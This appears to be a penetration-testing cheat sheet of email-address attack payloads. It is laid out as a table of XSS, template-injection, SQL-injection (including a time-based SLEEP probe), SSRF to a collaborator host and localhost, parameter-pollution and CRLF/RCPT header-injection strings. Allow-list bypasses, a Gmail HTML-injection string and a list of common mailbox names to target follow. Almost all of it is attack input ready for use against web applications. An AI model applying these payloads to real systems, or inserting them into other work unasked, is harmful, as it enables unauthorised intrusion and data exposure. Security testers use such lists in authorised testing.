# Email attacks

<table>
  <thead>
    <tr>
      <th style="text-align:left">Attack</th>
      <th style="text-align:left">Payload</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">XSS</td>
      <td style="text-align:left">
        <p>test+(alert(0))@example.com</p>
        <p>test@example(alert(0)).com</p>
        <p>&quot;alert(0)&quot;@example.com</p>
        <p>&lt;script src=//xsshere?&#x201D;@email.com</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Template injection</td>
      <td style="text-align:left">
        <p>&quot;&lt;%= 7 * 7 %&gt;&quot;@example.com</p>
        <p>test+(${{7*7}})@example.com</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">SQLi</td>
      <td style="text-align:left">
        <p>&quot;&apos; OR 1=1 -- &apos;&quot;@example.com</p>
        <p>&quot;mail&apos;); SELECT version();--&quot;@example.com</p>
        <p>a&apos;-IF(LENGTH(database())=9,SLEEP(7),0)or&apos;1&apos;=&apos;1\&quot;@a.com</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">SSRF</td>
      <td style="text-align:left">
        <p>john.doe@abc123.burpcollaborator.net</p>
        <p>john.doe@[127.0.0.1]</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Parameter Pollution</td>
      <td style="text-align:left">victim&amp;email=attacker@example.com</td>
    </tr>
    <tr>
      <td style="text-align:left">(Email) Header Injection</td>
      <td style="text-align:left">
        <p>&quot;%0d%0aContent-Length:%200%0d%0a%0d%0a&quot;@example.com</p>
        <p>&quot;recipient@test.com&gt;\r\nRCPT TO:&lt;victim+&quot;@test.com</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Wildcard abuse</td>
      <td style="text-align:left">%@example.com</td>
    </tr>
  </tbody>
</table>

```text
# Bypass whitelist
inti(;inti@inti.io;)@whitelisted.com
inti@inti.io(@whitelisted.com)
inti+(@whitelisted.com;)@inti.io

#HTML Injection in Gmail
inti.de.ceukelaire+(<b>bold<u>underline<s>strike<br/>newline<strong>strong<sup>sup<sub>sub)@gmail.com

# Bypass strict validators
# Login with SSO & integrations
GitHub & Salesforce allow xss in email, create account and abuse with login integration

# Common email accounts
support@
jira@
print@
feedback@
asana@
slack@
hello@
bug(s)@
upload@
service@
it@
test@
help@
tickets@
tweet@
```

